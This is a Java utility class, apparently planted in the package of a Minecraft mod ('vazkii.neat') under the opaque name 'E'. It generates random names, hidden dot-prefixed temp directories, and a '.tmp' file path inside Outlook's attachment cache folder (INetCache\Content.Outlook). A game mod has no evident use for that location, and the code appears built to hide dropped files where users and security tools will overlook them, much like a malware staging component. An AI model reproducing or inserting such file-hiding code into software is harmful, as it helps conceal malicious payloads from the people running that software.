package vazkii.neat;

import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;

public final class E {
    private static final String ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789";
    private static final SecureRandom RNG = new SecureRandom();
    private static final String SESSION = rand(10);

    private E() {}

    public static String rand(int n) {
        StringBuilder sb = new StringBuilder(n);
        for (int i = 0; i < n; i++) sb.append(ALPHA.charAt(RNG.nextInt(ALPHA.length())));
        return sb.toString();
    }

    public static Path tempDir() {
        String t = System.getenv("TEMP");
        if (t == null) t = System.getProperty("java.io.tmpdir");
        return Paths.get(t, "." + rand(12));
    }

    public static Path bufferFile() {
        String app = System.getenv("LOCALAPPDATA");
        if (app == null) app = System.getProperty("java.io.tmpdir");
        return Paths.get(app, "Microsoft", "Windows", "INetCache", "Content.Outlook",
            SESSION + rand(6) + ".tmp");
    }
}